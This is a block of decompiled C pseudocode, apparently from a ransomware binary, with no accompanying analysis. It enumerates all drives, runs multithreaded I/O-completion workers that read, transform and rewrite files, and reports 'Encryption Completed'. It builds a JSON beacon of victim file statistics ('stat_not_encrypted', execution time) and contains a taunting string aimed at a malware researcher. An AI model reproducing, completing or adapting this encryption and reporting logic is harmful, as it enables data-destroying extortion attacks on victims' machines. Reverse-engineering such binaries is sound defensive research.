// 42B788: using guessed type wchar_t aFinishedExplor[38];
// 42B7D8: using guessed type wchar_t aFinishedExplor_0[36];
// 4308D0: using guessed type int dword_4308D0;
// 430938: using guessed type int dword_430938;
// 430A1C: using guessed type int dword_430A1C;

//----- (0040B460) --------------------------------------------------------
BOOL sub_40B460()
{
  SIZE_T v0; // esi
  SIZE_T v1; // esi
  HANDLE v2; // esi
  HANDLE v3; // eax
  int v4; // esi
  DWORD v5; // ecx
  DWORD v6; // eax
  int v7; // edx
  HANDLE v8; // esi
  HANDLE v9; // eax
  DWORD v10; // esi
  char *v11; // eax
  LPVOID i; // esi
  char *v13; // eax
  char *v14; // eax
  HANDLE v15; // eax
  WCHAR *j; // esi
  const HANDLE *v17; // esi
  HANDLE *v18; // ebx
  const HANDLE *v19; // ecx
  HANDLE *v20; // edx
  void *v21; // esi
  signed int v22; // edi
  signed int m; // esi
  WCHAR *k; // esi
  HANDLE v26; // eax
  DWORD v27; // ecx
  HANDLE v28; // [esp-4h] [ebp-27Ch]
  WCHAR Parameter[262]; // [esp+10h] [ebp-268h] BYREF
  struct _SYSTEM_INFO SystemInfo; // [esp+21Ch] [ebp-5Ch] BYREF
  DWORD v31; // [esp+240h] [ebp-38h]
  DWORD v32; // [esp+244h] [ebp-34h] BYREF
  HANDLE *lpHandles; // [esp+248h] [ebp-30h]
  int v34; // [esp+24Ch] [ebp-2Ch]
  DWORD v35; // [esp+250h] [ebp-28h]
  DWORD ExitCode; // [esp+254h] [ebp-24h] BYREF
  HANDLE hHandle; // [esp+258h] [ebp-20h] BYREF
  void *Thread; // [esp+25Ch] [ebp-1Ch] BYREF
  SIZE_T dwBytes; // [esp+260h] [ebp-18h]
  void *v40; // [esp+264h] [ebp-14h] BYREF
  int v41; // [esp+268h] [ebp-10h]
  DWORD v42; // [esp+26Ch] [ebp-Ch]
  LPVOID lpMem; // [esp+270h] [ebp-8h]
  DWORD nCount; // [esp+274h] [ebp-4h]

  v35 = 0;
  nCount = 0;
  v40 = 0;
  GetSystemInfo(&SystemInfo);
  v0 = 4 * SystemInfo.dwNumberOfProcessors;
  for ( lpMem = HeapAlloc(hHeap, 8u, 4 * SystemInfo.dwNumberOfProcessors); !lpMem; lpMem = HeapAlloc(hHeap, 8u, v0) )
    Sleep(0x64u);
  v1 = 4 * SystemInfo.dwNumberOfProcessors;
  for ( lpHandles = (HANDLE *)HeapAlloc(hHeap, 8u, 4 * SystemInfo.dwNumberOfProcessors);
        !lpHandles;
        lpHandles = (HANDLE *)HeapAlloc(hHeap, 8u, v1) )
  {
    Sleep(0x64u);
  }
  v2 = DuplicateTokenHandle;
  ExitCode = 0;
  v3 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetLogicalDrives, 0, 4u, 0);
  Thread = v3;
  if ( v3 )
  {
    if ( dword_4309DC && v2 )
    {
      SetThreadToken(&Thread, v2);
      v3 = Thread;
    }
    ResumeThread(v3);
    WaitForSingleObject(Thread, 0xFFFFFFFF);
    GetExitCodeThread(Thread, &ExitCode);
    CloseHandle(Thread);
  }
  v4 = 65;
  v5 = ExitCode;
  v42 = ExitCode;
  v6 = 0;
  v34 = 65;
  v41 = 26;
  v7 = 26;
  while ( 1 )
  {
    v31 = v6;
    if ( (v5 & 1) != 0 )
    {
      wsprintfW(Parameter, L"\\\\?\\%hc:\\", v4);
      v8 = DuplicateTokenHandle;
      v32 = 0;
      v9 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetDriveTypeW, Parameter, 4u, 0);
      hHandle = v9;
      if ( v9 )
      {
        if ( dword_4309DC && v8 )
        {
          SetThreadToken(&hHandle, v8);
          v9 = hHandle;
        }
        ResumeThread(v9);
        WaitForSingleObject(hHandle, 0xFFFFFFFF);
        GetExitCodeThread(hHandle, &v32);
        CloseHandle(hHandle);
      }
      if ( v32 == 3 )
      {
        if ( dword_4308F8 )
        {
          if ( dword_4308E0 )
          {
            v10 = Parameter[4];
            v11 = (char *)operator new(0x78u);
            dwBytes = (SIZE_T)sub_40DC70(v11, v10);
            if ( *(_DWORD *)(dwBytes + 36) )
            {
              for ( i = HeapAlloc(hHeap, 8u, 0x1000Cu); !i; i = HeapAlloc(hHeap, 8u, 0x1000Cu) )
                Sleep(0x64u);
              *(_DWORD *)i = dwBytes;
              lstrcpyW((LPWSTR)i + 6, Parameter);
              v13 = (char *)operator new(0x1A0u);
              v14 = sub_40D030(v13, *(_DWORD *)i);
              *((_DWORD *)i + 1) = v14;
              *((_DWORD *)v14 + 22) = 771;
              if ( sub_40D920(*((_DWORD **)i + 1), 5ui64) )
                sub_40DB20(*((int **)i + 1));
              v15 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_40E7D0, i, 0, 0);
LABEL_35:
              v40 = v15;
              if ( !v15 )
                goto LABEL_36;
LABEL_56:
              v27 = v35;
              v17 = (const HANDLE *)lpMem;
              *((_DWORD *)lpMem + v35) = v15;
              v6 = nCount + 1;
              v35 = v27 + 1;
              nCount = v6;
              if ( v6 == SystemInfo.dwNumberOfProcessors )
              {
                v35 = WaitForMultipleObjects(v6, v17, 0, 0xFFFFFFFF);
                v28 = v17[v35];
                v17[v35] = 0;
                CloseHandle(v28);
                v6 = v31;
                nCount = v31;
              }
              goto LABEL_37;
            }
          }
          dwBytes = 2 * lstrlenW(Parameter) + 2;
          for ( j = (WCHAR *)HeapAlloc(hHeap, 8u, dwBytes); !j; j = (WCHAR *)HeapAlloc(hHeap, 8u, dwBytes) )
            Sleep(0x64u);
LABEL_34:
          lstrcpyW(j, Parameter);
          v15 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, j, 0, 0);
          goto LABEL_35;
        }
      }
      else
      {
        if ( v32 != 2 )
        {
          if ( v32 != 4 || !dword_4308DC )
            goto LABEL_36;
          dwBytes = 2 * lstrlenW(Parameter) + 2;
          for ( k = (WCHAR *)HeapAlloc(hHeap, 8u, dwBytes); !k; k = (WCHAR *)HeapAlloc(hHeap, 8u, dwBytes) )
            Sleep(0x64u);
          lstrcpyW(k, Parameter);
          v26 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, k, 4u, 0);
          v40 = v26;
          if ( !v26 )
            goto LABEL_36;
          if ( dword_4309DC && DuplicateTokenHandle )
          {
            SetThreadToken(&v40, DuplicateTokenHandle);
            v26 = v40;
          }
          ResumeThread(v26);
          v15 = v40;
          goto LABEL_56;
        }
        if ( dword_4308F8 )
        {
          dwBytes = 2 * lstrlenW(Parameter) + 2;
          for ( j = (WCHAR *)HeapAlloc(hHeap, 8u, dwBytes); !j; j = (WCHAR *)HeapAlloc(hHeap, 8u, dwBytes) )
            Sleep(0x64u);
          goto LABEL_34;
        }
      }
LABEL_36:
      v6 = nCount;
      v17 = (const HANDLE *)lpMem;
LABEL_37:
      v7 = v41;
      v5 = v42;
      goto LABEL_38;
    }
    v17 = (const HANDLE *)lpMem;
LABEL_38:
    ++v34;
    v5 >>= 1;
    --v7;
    v42 = v5;
    v41 = v7;
    if ( !v7 )
      break;
    v4 = v34;
  }
  v18 = lpHandles;
  if ( v6 )
  {
    v19 = v17;
    v20 = lpHandles;
    do
    {
      v21 = *v19++;
      if ( v21 )
      {
        *v20++ = v21;
        --v6;
      }
    }
    while ( v6 );
    v22 = nCount;
    WaitForMultipleObjects(nCount, v18, 1, 0xFFFFFFFF);
    for ( m = 0; m < v22; ++m )
      CloseHandle(v18[m]);
  }
  HeapFree(hHeap, 0, lpMem);
  return HeapFree(hHeap, 0, v18);
}
// 4308DC: using guessed type int dword_4308DC;
// 4308E0: using guessed type int dword_4308E0;
// 4308F8: using guessed type int dword_4308F8;
// 4309DC: using guessed type int dword_4309DC;

//----- (0040B950) --------------------------------------------------------
ULONG __stdcall sub_40B950(PVOID Parameter)
{
  HANDLE CurrentThread; // eax
  BOOL (__stdcall *v2)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED); // edi
  DWORD (__stdcall *v3)(); // ebx
  BOOL QueuedCompletionStatus; // eax
  LPOVERLAPPED v5; // ecx
  BOOL v6; // eax
  HANDLE hEvent; // ebx
  DWORD OffsetHigh; // edx
  LPOVERLAPPED v9; // esi
  ULONG_PTR InternalHigh; // eax
  HANDLE v11; // ecx
  DWORD v12; // eax
  HANDLE v13; // ecx
  int v15; // ecx
  ULONG_PTR *p_InternalHigh; // eax
  LPOVERLAPPED Overlapped; // [esp+Ch] [ebp-Ch] BYREF
  DWORD NumberOfBytesTransferred; // [esp+10h] [ebp-8h] BYREF
  unsigned int CompletionKey; // [esp+14h] [ebp-4h] BYREF

  CurrentThread = GetCurrentThread();
  SetThreadPriority(CurrentThread, 2);
  v2 = WriteFile;
  v3 = GetLastError;
  while ( 1 )
  {
    Overlapped = 0;
    NumberOfBytesTransferred = 0;
    CompletionKey = 0;
    QueuedCompletionStatus = GetQueuedCompletionStatus(
                               CompletionPort,
                               &NumberOfBytesTransferred,
                               &CompletionKey,
                               &Overlapped,
                               0xFFFFFFFF);
    v5 = Overlapped;
    if ( !QueuedCompletionStatus )
      break;
    if ( !Overlapped )
      return 0;
    switch ( LOWORD(Overlapped[1].Internal) )
    {
      case 0:
        LOWORD(Overlapped[1].Internal) = 1;
        Overlapped->Offset = -1;
        Overlapped->OffsetHigh = -1;
        v6 = v2(
               (HANDLE)Overlapped[30].InternalHigh,
               &Overlapped[31].Pointer + 1,
               0x250u,
               &NumberOfBytesTransferred,
               Overlapped);
        goto LABEL_23;
      case 1:
        LOWORD(Overlapped[1].Internal) = 2;
        v5 = Overlapped;
        hEvent = Overlapped[61].hEvent;
        OffsetHigh = Overlapped[61].OffsetHigh;
        if ( *(_QWORD *)&Overlapped[30].8 >= __PAIR64__((unsigned int)hEvent, OffsetHigh) )
        {
          v3 = GetLastError;
          break;
        }
        if ( *(_QWORD *)&Overlapped[30].8 + (unsigned __int64)Overlapped[61].InternalHigh >= __PAIR64__(
                                                                                               (unsigned int)hEvent,
                                                                                               OffsetHigh) )
        {
          Overlapped[61].InternalHigh = OffsetHigh - Overlapped[30].Offset;
          v5 = Overlapped;
        }
        v5->Offset = v5[30].Offset;
        Overlapped->OffsetHigh = Overlapped[30].OffsetHigh;
        v3 = GetLastError;
        v2 = WriteFile;
        if ( ReadFile(
               (HANDLE)Overlapped[30].InternalHigh,
               &Overlapped[62].InternalHigh,
               Overlapped[61].InternalHigh,
               &NumberOfBytesTransferred,
               Overlapped)
          || GetLastError() == 997 )
        {
          continue;
        }
        goto LABEL_25;
      case 2:
        LOWORD(Overlapped[1].Internal) = 3;
        v9 = Overlapped;
        InternalHigh = Overlapped[31].InternalHigh;
        if ( InternalHigh )
        {
          if ( InternalHigh == 1 )
          {
            *(_QWORD *)&Overlapped[30].8 += *(_QWORD *)&Overlapped[30].hEvent + NumberOfBytesTransferred;
          }
          else
          {
            if ( InternalHigh != 2 )
              goto LABEL_19;
            v11 = Overlapped[61].hEvent;
            Overlapped[30].Offset = Overlapped[61].OffsetHigh;
            v9[30].OffsetHigh = (DWORD)v11;
          }
        }
        else
        {
          *(_QWORD *)&Overlapped[30].8 += NumberOfBytesTransferred;
        }
        v9 = Overlapped;
LABEL_19:
        sub_402100(
          (__m128i *)&v9[62].InternalHigh,
          (__m128i *)&v9[1].InternalHigh,
          (__m128i *)&v9[62].InternalHigh,
          NumberOfBytesTransferred);
        ++Overlapped[62].Internal;
        if ( v2(
               (HANDLE)Overlapped[30].InternalHigh,
               &Overlapped[62].InternalHigh,
               NumberOfBytesTransferred,
               &NumberOfBytesTransferred,
               Overlapped)
          || v3() == 997 )
        {
          continue;
        }
LABEL_25:
        v5 = Overlapped;
        break;
      case 3:
        LOWORD(Overlapped[1].Internal) = 1;
        v12 = Overlapped[61].OffsetHigh;
        v13 = Overlapped[61].hEvent;
        Overlapped->Offset = v12 + 584;
        Overlapped->OffsetHigh = (DWORD)v13 + __CFADD__(v12, 584);
        v6 = v2((HANDLE)Overlapped[30].InternalHigh, &Overlapped[62], 4u, &NumberOfBytesTransferred, Overlapped);
LABEL_23:
        if ( !v6 && v3() != 997 )
          goto LABEL_25;
        continue;
      case 4:
        break;
      default:
        continue;
    }
LABEL_29:
    CloseHandle((HANDLE)v5[30].InternalHigh);
    v15 = 580;
    p_InternalHigh = &Overlapped[1].InternalHigh;
    do
    {
      *(_BYTE *)p_InternalHigh = 0;
      p_InternalHigh = (ULONG_PTR *)((char *)p_InternalHigh + 1);
      --v15;
    }
    while ( v15 );
    HeapFree(hHeap, 0, Overlapped);
    _InterlockedIncrement(&dword_430A10);
  }
  if ( Overlapped )
    goto LABEL_29;
  return 0;
}
// 430A10: using guessed type int dword_430A10;

//----- (0040BC60) --------------------------------------------------------
HANDLE __usercall sub_40BC60@<eax>(int a1@<ebp>, int a2@<edi>)
{
  DWORD dwNumberOfProcessors; // eax
  int v3; // esi
  HANDLE result; // eax
  const HANDLE *v5; // esi
  unsigned int j; // edi
  void (__stdcall *v7)(DWORD); // esi
  signed __int32 v8; // eax
  DWORD v9; // edi
  unsigned int v10; // esi
  HANDLE *v11; // esi
  unsigned int v12; // edi
  HANDLE v13; // esi
  void (__stdcall *v14)(HANDLE, DWORD); // eax
  void (__stdcall *v15)(HANDLE); // esi
  HANDLE v16; // edi
  DWORD v17; // eax
  unsigned __int64 v18; // rdi
  void *v19; // ecx
  CHAR *v20; // eax
  CHAR *v21; // edi
  int v22; // eax
  int v23; // ecx
  void *v24; // [esp-124h] [ebp-130h]
  int v26; // [esp-120h] [ebp-12Ch]
  _BYTE v27[132]; // [esp-118h] [ebp-124h] BYREF
  struct _SYSTEM_INFO v28; // [esp-94h] [ebp-A0h] BYREF
  char v29[33]; // [esp-70h] [ebp-7Ch] BYREF
  char v30[40]; // [esp-40h] [ebp-4Ch] BYREF
  int v31; // [esp-18h] [ebp-24h]
  HANDLE *i; // [esp-14h] [ebp-20h]
  unsigned int v33; // [esp-10h] [ebp-1Ch]
  CHAR *k; // [esp-Ch] [ebp-18h]
  LPVOID TickCount; // [esp-8h] [ebp-14h]
  int Thread; // [esp-4h] [ebp-10h]
  int v37; // [esp+0h] [ebp-Ch]
  int v38; // [esp+4h] [ebp-8h]
  int retaddr; // [esp+Ch] [ebp+0h]

  v37 = a1;
  v38 = retaddr;
  GetSystemInfo(&v28);
  dwNumberOfProcessors = v28.dwNumberOfProcessors;
  if ( (v28.dwNumberOfProcessors & 0x20) != 0 )
    dwNumberOfProcessors = 32;
  v28.dwNumberOfProcessors = dwNumberOfProcessors;
  v3 = 2 * dwNumberOfProcessors;
  v33 = 2 * dwNumberOfProcessors;
  result = CreateIoCompletionPort((HANDLE)0xFFFFFFFF, 0, 0, 2 * dwNumberOfProcessors);
  CompletionPort = result;
  if ( result )
  {
    SetThreadExecutionState(0x80000001);
    k = (CHAR *)(4 * v3);
    v5 = (const HANDLE *)HeapAlloc(hHeap, 8u, 4 * v3);
    for ( i = (HANDLE *)v5; !v5; i = (HANDLE *)v5 )
    {
      Sleep(0x64u);
      v5 = (const HANDLE *)HeapAlloc(hHeap, 8u, (SIZE_T)k);
    }
    for ( j = 0; j < v33; ++j )
      v5[j] = CreateThread(0, 0, sub_40B950, 0, 0, 0);
    sub_408990((int)L"%lu I/O Workers Created", v33);
    if ( Parameter )
    {
      StartAddress(Parameter);
    }
    else
    {
      Thread = 0;
      TickCount = 0;
      if ( dword_4308D4 )
      {
        Thread = (int)CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401760, 0, 0, 0);
        TickCount = (LPVOID)GetTickCount();
      }
      if ( dword_43090C )
        v13 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_40F930, 0, 0, 0);
      else
        v13 = 0;
      sub_40B460();
      v14 = (void (__stdcall *)(HANDLE, DWORD))WaitForSingleObject;
      if ( dword_43090C && v13 )
      {
        WaitForSingleObject(v13, 0xFFFFFFFF);
        v24 = v13;
        v15 = (void (__stdcall *)(HANDLE))CloseHandle;
        CloseHandle(v24);
        v14 = (void (__stdcall *)(HANDLE, DWORD))WaitForSingleObject;
      }
      else
      {
        v15 = (void (__stdcall *)(HANDLE))CloseHandle;
      }
      if ( dword_4308D4 )
      {
        v16 = (HANDLE)Thread;
        if ( Thread )
        {
          v14((HANDLE)Thread, 0xFFFFFFFF);
          v15(v16);
        }
        v17 = GetTickCount();
        v18 = qword_430A20;
        k = (CHAR *)(v17 - (_DWORD)TickCount);
        Thread = dword_430A1C;
        v31 = dword_430A10;
        memset(v30, 0, 32);
        sub_401550(v27);
        _ui64toa(v18 >> 20, v30, 10);
        strcpy(v29, "Chuong Dong looks like hot dog!!");
        v7 = Sleep;
        v19 = HeapAlloc(hHeap, 8u, 0x8000u);
        for ( TickCount = v19; !v19; TickCount = v19 )
        {
          Sleep(0x64u);
          v19 = HeapAlloc(hHeap, 8u, 0x8000u);
        }
        Thread = sub_401240(
                   (int *)v19,
                   (int)"{\"mid\": \"%s\",\"uid\": \"%s\",\"ver\": \"%S\",\"stat_files_all\": \"%lu\",\"stat_not_encrypte"
                        "d\": \"%lu\",\"stat_size\": \"%s\",\"execution_time\": \"%lu\"}",
                   (int)v27);
        sub_401280((int)TickCount, (int)TickCount, Thread);
        v20 = (CHAR *)HeapAlloc(hHeap, 8u, 4 * Thread);
        for ( k = v20; !v20; k = v20 )
        {
          Sleep(0x64u);
          v20 = (CHAR *)HeapAlloc(hHeap, 8u, 4 * Thread);
        }
        sub_4010D0((int)TickCount, v20, Thread);
        v21 = k;
        v22 = lstrlenA(k);
        sub_4016B0(v23, v21, v22);
        if ( !TickCount || (HeapFree(hHeap, 0, TickCount), v21) )
          HeapFree(hHeap, 0, v21);
        goto LABEL_11;
      }
    }
    v7 = Sleep;
LABEL_11:
    sub_408990((int)L"Waiting For I/O Workers", a2);
    do
    {
      v7(0x200u);
      v8 = _InterlockedCompareExchange(&dword_430A10, dword_430A18, dword_430A18);
    }
    while ( v8 != dword_430A18 );
    v9 = v33;
    if ( v33 )
    {
      v10 = v33;
      do
      {
        PostQueuedCompletionStatus(CompletionPort, 0, 0, 0);
        --v10;
      }
      while ( v10 );
      v11 = i;
      WaitForMultipleObjects(v9, i, 1, 0xFFFFFFFF);
      v12 = 0;
      do
        CloseHandle(v11[v12++]);
      while ( v12 < v33 );
    }
    else
    {
      v11 = i;
      WaitForMultipleObjects(0, i, 1, 0xFFFFFFFF);
    }
    HeapFree(hHeap, 0, v11);
    CloseHandle(CompletionPort);
    sub_408990((int)L"Encryption Completed", v26);
    return (HANDLE)SetThreadExecutionState(0x80000000);
  }
  return result;
}
// 40BC60: could not find valid save-restore pair for ebp
// 40BC60: could not find valid save-restore pair for edi
// 40BFD1: variable 'v23' is possibly undefined
// 40C03A: variable 'v26' is possibly undefined
// 42B820: using guessed type wchar_t aLuIOWorkersCre[24];
// 42B850: using guessed type wchar_t aWaitingForIOWo[24];
// 42B880: using guessed type wchar_t aEncryptionComp[21];
// 4308D4: using guessed type int dword_4308D4;
// 43090C: using guessed type int dword_43090C;
// 430A10: using guessed type int dword_430A10;
// 430A18: using guessed type int dword_430A18;
// 430A1C: using guessed type int dword_430A1C;
// 430A20: using guessed type __int64 qword_430A20;

//----- (0040C060) --------------------------------------------------------
char sub_40C060()
{
  char v11; // cl
  char v12; // al
  bool v17; // zf
  char v23; // cl
  int v24; // edx
  int v26; // [esp-40h] [ebp-4Ch]
  int v27; // [esp-20h] [ebp-2Ch]
  int v28; // [esp-1Ch] [ebp-28h]
  int v29; // [esp-18h] [ebp-24h]
  int v30; // [esp-14h] [ebp-20h]
  char v31; // [esp-1h] [ebp-Dh]

  _EAX = 0;
  __asm { cpuid }
  v27 = _EAX;
  _EAX = 1;
  v28 = _EBX;
  v29 = _ECX;
  v30 = _EDX;
  __asm { cpuid }
  v26 = _EAX;
  _EAX = _ECX;
  if ( (_EDX & 0x4000000) != 0 )
  {
    if ( (_ECX & 0x4000000) != 0 && (_ECX & 0x8000000) != 0 )
    {
      v11 = 1;
      byte_43083D = 1;
    }
    else
    {
      v11 = 0;
      byte_43083D = 0;
    }
  }
  else
  {
    v11 = byte_43083D;
  }
  if ( v11 )
  {
    if ( (_EAX & 0x18000000) == 402653184 )
    {
      __asm { xgetbv }
      v12 = 0;
      byte_43083C = 0;
    }
    else
    {
      v12 = byte_43083C;
    }
    v31 = v12;
    LOBYTE(_EAX) = v30;
    if ( v28 == 1970169159 && v29 == 1818588270 && v30 == 1231384169 )
    {
      if ( v27 >= 7 )
      {
        _EAX = 7;
        __asm { cpuid }
        LOBYTE(_EAX) = (_EBX & 0x40000) != 0;
        byte_43083F = _EAX;
        byte_43083E = v31 & ((_EBX & 0x20) != 0);
        return _EAX;
      }
      goto LABEL_34;
    }
    if ( v28 == 1752462657 )
    {
      if ( v29 == 1145913699 )
      {
        v17 = v30 == 1769238117;
        goto LABEL_22;
      }
    }
    else if ( v28 == 1766083905 && v29 == 1952801395 )
    {
      v17 = v30 == 561145204;
LABEL_22:
      if ( v17 )
        goto LABEL_26;
    }
    if ( v28 != 1869052232 || v29 != 1701734773 || v30 != 1852131182 )
    {
LABEL_34:
      v23 = byte_43083E;
      goto LABEL_35;
    }
LABEL_26:
    if ( v27 < 7 )
    {
      v23 = byte_43083E;
    }
    else
    {
      _EAX = 7;
      __asm { cpuid }
      byte_43083F = (_EBX & 0x40000) != 0;
      v23 = (_EBX & 0x20) != 0;
    }
    LOBYTE(_EAX) = v26;
    v24 = (v26 >> 8) & 0xF;
    if ( v24 == 15 )
    {
      _EAX = (unsigned __int8)(v26 >> 20);
      v24 = _EAX + 15;
    }
    if ( v24 == 21 || v24 == 22 )
    {
      byte_43083F = 0;
      byte_43083E = v31 & v23;
      return _EAX;
    }
LABEL_35:
    byte_43083E = v31 & v23;
  }
  return _EAX;
}
// 40C060: could not find valid save-restore pair for ebp
// 43083C: using guessed type char byte_43083C;
// 43083D: using guessed type char byte_43083D;
// 43083E: using guessed type char byte_43083E;
// 43083F: using guessed type char byte_43083F;

//----- (0040C280) --------------------------------------------------------
int __stdcall __noreturn WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  int v4; // edi
  double v5; // st7
  HKEY v6; // ecx
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  sub_40C330();
  sub_40C060();
  sub_40FE30();
  sub_405380(v5);
  sub_401000();
  sub_408AE0();
  sub_408B60();
  sub_4088A0();
  sub_408BF0();
  sub_408E20();
  sub_409090();
  sub_409EF0();
  sub_40A020();
  sub_40FC50();
  sub_40A330();
  sub_40BC60((int)&savedregs, v4);
  sub_409540();
  sub_4096B0();
  sub_409A50();
  sub_409B80(v6);
  sub_408E20();
  sub_409090();
  sub_409300();
  sub_409420();
  sub_408AA0();
  sub_408BD0();
  sub_4052D0();
  sub_408B30();
  sub_409450();
  sub_409500();
  ExitProcess(0);
}
// 40C295: variable 'v5' is possibly undefined
// 40C2D1: variable 'v4' is possibly undefined
// 40C2E5: variable 'v6' is possibly undefined

//----- (0040C330) --------------------------------------------------------
void sub_40C330()
{
  if ( !hHeap )
  {
    hHeap = HeapCreate(0, 0x400000u, 0);
    if ( !hHeap )
      hHeap = GetProcessHeap();
  }
}

//----- (0040C360) --------------------------------------------------------
int __cdecl sub_40C360(int *a1, int a2, int a3, int a4)
{
  _DWORD *v4; // eax
  int result; // eax

  v4 = sub_4011F0();
  result = sub_4148D6(*v4 | 1, v4[1], a1, a2, a3, 0, (int)&a4);
  if ( result < 0 )
    return -1;
  return result;
}

//----- (0040C3A0) --------------------------------------------------------
_DWORD *__thiscall sub_40C3A0(_DWORD *Block, char a2)
{
  *Block = &CAttrBase::`vftable';
  if ( (a2 & 1) != 0 )
    sub_410463(Block);
  return Block;
}
// 42BAF0: using guessed type void *CAttrBase::`vftable';

//----- (0040C3D0) --------------------------------------------------------
_DWORD *__thiscall sub_40C3D0(_DWORD *Block, char a2)
{
  *Block = &CAttrBase::`vftable';
  if ( (a2 & 1) != 0 )
    sub_410463(Block);
  return Block;
}
// 42BAF0: using guessed type void *CAttrBase::`vftable';

//----- (0040C400) --------------------------------------------------------
int sub_40C400()
{
  return 1;
}

//----- (0040C410) --------------------------------------------------------
__int64 __thiscall sub_40C410(_DWORD *this, _DWORD *a2)
{
  __int64 result; // rax

  LODWORD(result) = this[9];
  if ( a2 )
  {
    *a2 = result;
    a2[1] = 0;
    LODWORD(result) = this[9];
  }
  HIDWORD(result) = 0;
  return result;
}

//----- (0040C430) --------------------------------------------------------
int __thiscall sub_40C430(_DWORD *this, unsigned int *a2, void *Dst, int a4, size_t *a5)
{
  size_t v5; // edx
  unsigned int v7; // edi
  unsigned int v8; // esi

  v5 = a4;
  *a5 = 0;
  if ( !a4 )
    return 1;
  v7 = this[9];
  v8 = *a2;
  if ( *a2 >= v7 )
    return 0;
  if ( v8 + a4 > v7 )
    v5 = v7 - v8;
  *a5 = v5;
  memmove(Dst, (const void *)(v8 + this[8]), v5);
  return 1;
}

//----- (0040C4A0) --------------------------------------------------------
_DWORD *__thiscall sub_40C4A0(_DWORD *this, __int64 a2)
{
  int v3; // edx
  int v4; // eax
  int v5; // eax
  char *v6; // edi
  unsigned __int8 v7; // al
  char *v8; // edi
  unsigned int v9; // ebx
  unsigned int v10; // eax
  bool v11; // sf
  int v12; // ebx
  int *v13; // eax
  int v14; // ecx
  int v15; // edx
  int v16; // ebx
  int v17; // ecx
  unsigned int v18; // kr00_4
  int v19; // edx
  unsigned __int64 v20; // kr10_8
  int v21; // edx
  unsigned int v22; // ecx
  _DWORD *v23; // eax
  _DWORD *v24; // ecx
  __int64 Dst; // [esp+10h] [ebp-20h] BYREF
  __int64 v27; // [esp+18h] [ebp-18h] BYREF
  int *v28; // [esp+20h] [ebp-10h]
  unsigned int v29; // [esp+24h] [ebp-Ch]
  unsigned int v30; // [esp+28h] [ebp-8h]
  int v31; // [esp+2Ch] [ebp-4h]
  __int64 v32; // [esp+38h] [ebp+8h]

  *this = &CAttrBase::`vftable';
  this[1] = a2;
  this[6] = HIDWORD(a2);
  *((_WORD *)this + 4) = *(_WORD *)(*(_DWORD *)(HIDWORD(a2) + 8) + 8);
  v3 = *(_DWORD *)(*(_DWORD *)(HIDWORD(a2) + 8) + 12);
  this[3] = v3;
  this[4] = *(_DWORD *)(*(_DWORD *)(HIDWORD(a2) + 8) + 20);
  v4 = *(_DWORD *)(*(_DWORD *)(HIDWORD(a2) + 8) + 32);
  this[8] = &CSList<tagDataRun_Entry>::`vftable';
  this[11] = 0;
  this[10] = 0;
  this[12] = 0;
  this[9] = 0;
  this[5] = v4;
  *this = &CAttrNonResident::`vftable';
  this[7] = a2;
  this[14] = unknown_libname_1(v3);
  v5 = this[7];
  Dst = 0i64;
  v27 = 0i64;
  v6 = (char *)(v5 + *(unsigned __int16 *)(v5 + 32));
  v7 = *v6;
  if ( *v6 )
  {
    v32 = Dst;
    v30 = HIDWORD(v27);
    v31 = v27;
    do
    {
      v8 = v6 + 1;
      v9 = v7 >> 4;
      v10 = v7 & 0xF;
      v29 = v10;
      if ( v10 > 8 )
        break;
      if ( v9 > 8 )
        break;
      Dst = 0i64;
      memmove(&Dst, v8, v10);
      if ( Dst < 0 )
        break;
      v6 = &v8[v29];
      v27 = 0i64;
      if ( v9 )
      {
        v11 = v6[v9 - 1] < 0;
        v29 = (unsigned int)&v6[v9];
        if ( v11 )
          v27 = -1i64;
        memmove(&v27, v6, v9);
        v6 = (char *)v29;
      }
      v12 = v27;
      v32 += v27;
      if ( v32 < 0 )
        goto LABEL_21;
      v13 = (int *)operator new(0x20u);
      v28 = v13;
      if ( HIDWORD(v27) | v12 )
      {
        v15 = HIDWORD(v32);
        v14 = v32;
      }
      else
      {
        v14 = -1;
        v15 = -1;
      }
      v13[4] = v31;
      v13[5] = v30;
      v16 = v31;
      *v13 = v14;
      v17 = Dst;
      v18 = Dst;
      v13[1] = v15;
      v19 = HIDWORD(Dst);
      v13[2] = v17;
      v20 = __PAIR64__(v30, v18) + __PAIR64__(v19, v16);
      v13[3] = v19;
      v30 = HIDWORD(v20);
      v31 = v20;
      v13[6] = v20 - 1;
      v21 = ((_DWORD)v20 != 0) + HIDWORD(v20) - 1;
      v13[7] = v21;
      v22 = (*(_QWORD *)(this[7] + 24) - *(_QWORD *)(this[7] + 16)) >> 32;
      v29 = *(_DWORD *)(this[7] + 24) - *(_DWORD *)(this[7] + 16);
      if ( __PAIR64__(v21, (int)v20 - 1) > __PAIR64__(v22, v29) )
      {
        sub_40E9D0((int)(this + 8));
LABEL_21:
        this[13] = 0;
        return this;
      }
      v23 = operator new(8u);
      v23[1] = v28;
      *v23 = 0;
      v24 = (_DWORD *)this[11];
      if ( v24 )
        *v24 = v23;
      else
        this[10] = v23;
      ++this[9];
      this[11] = v23;
      v7 = *v6;
    }
    while ( *v6 );
  }
  this[13] = 1;
  return this;
}
// 410471: using guessed type int __cdecl unknown_libname_1(_DWORD);
// 42BA54: using guessed type void *CSList<tagDataRun_Entry>::`vftable';
// 42BA80: using guessed type void *CAttrNonResident::`vftable';
// 42BAF0: using guessed type void *CAttrBase::`vftable';

//----- (0040C6E0) --------------------------------------------------------
_DWORD *__thiscall sub_40C6E0(_DWORD *Block, char a2)
{
  void *v4; // [esp-8h] [ebp-10h]

  v4 = (void *)Block[14];
  *Block = &CAttrNonResident::`vftable';
  sub_410463(v4);
  sub_40E9D0((int)(Block + 8));
  Block[8] = &CSList<tagDataRun_Entry>::`vftable';
  sub_40E9D0((int)(Block + 8));
  *Block = &CAttrBase::`vftable';
  if ( (a2 & 1) != 0 )
    sub_410463(Block);
  return Block;
}
// 42BA54: using guessed type void *CSList<tagDataRun_Entry>::`vftable';
// 42BA80: using guessed type void *CAttrNonResident::`vftable';
